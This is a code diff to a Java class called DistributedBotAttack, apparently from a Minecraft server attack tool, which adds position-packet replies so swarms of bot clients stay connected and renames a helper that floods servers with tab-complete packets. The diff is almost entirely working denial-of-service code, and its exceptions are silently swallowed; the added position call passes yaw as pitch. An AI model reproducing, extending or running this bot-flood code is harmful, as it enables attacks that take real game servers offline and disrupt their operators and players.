@@ -8,7 +8,6 @@ import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.Socket;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.ExecutorService;
@@ -18,8 +17,11 @@ import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
+import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
+import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerPositionRotationPacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
+import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
 import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.Session;
 import org.spacehq.packetlib.event.session.ConnectedEvent;
@@ -106,7 +108,7 @@ public class DistributedBotAttack extends IAttack {
                         clients.forEach(c -> {
                             if (c.getSession().isConnected()) {
                                 if (c.getSession().hasFlag("join")) {
-                                    sendTab(c.getSession(), "/");
+                                    sendTabPacket(c.getSession(), "/");
                                 }
                             }
                         });
@@ -209,6 +211,10 @@ public class DistributedBotAttack extends IAttack {
                 } else if (e.getPacket() instanceof ServerJoinGamePacket) {
                     e.getSession().setFlag("join", true);
                     Utils.log("Client", "[连接成功][" + username + "]");
+                } else if (e.getPacket() instanceof ServerPlayerPositionRotationPacket) {
+                    ServerPlayerPositionRotationPacket packet = e.getPacket();
+                    sendPosPacket(e.getSession(), packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
+                    e.getSession().send(new ClientPlayerMovementPacket(true));
                 }
             }
 
@@ -257,7 +263,7 @@ public class DistributedBotAttack extends IAttack {
         return false;
     }
 
-    public void sendTab(Session session, String text) {
+    public void sendTabPacket(Session session, String text) {
         try {
             Class<?> cls = ClientTabCompletePacket.class;
             Constructor<?> constructor = cls.getDeclaredConstructor();
@@ -267,8 +273,22 @@ public class DistributedBotAttack extends IAttack {
             field.setAccessible(true);
             field.set(packet, text);
             session.send(packet);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception e) {}
+    }
+
+    public void sendPosPacket(Session session, double x, double y, double z, float yaw, float pitch) {
+        try {
+            Class<?> cls = ClientPlayerPositionRotationPacket.class;
+            Constructor<?> constructor;
+            ClientPlayerPositionRotationPacket packet;
+            try {
+                constructor = cls.getConstructor(boolean.class, double.class, double.class, double.class, float.class, float.class);
+                packet = (ClientPlayerPositionRotationPacket) constructor.newInstance(true, x, y, z, yaw, pitch);
+            }catch (NoSuchMethodException ex) {
+                constructor = cls.getConstructor(boolean.class, double.class, double.class, double.class, double.class, float.class, float.class);
+                packet = (ClientPlayerPositionRotationPacket) constructor.newInstance(true, x, y - 1.62, y , z, yaw, pitch);
+            }
+            session.send(packet);
+        } catch (Exception e) {}
     }
 }
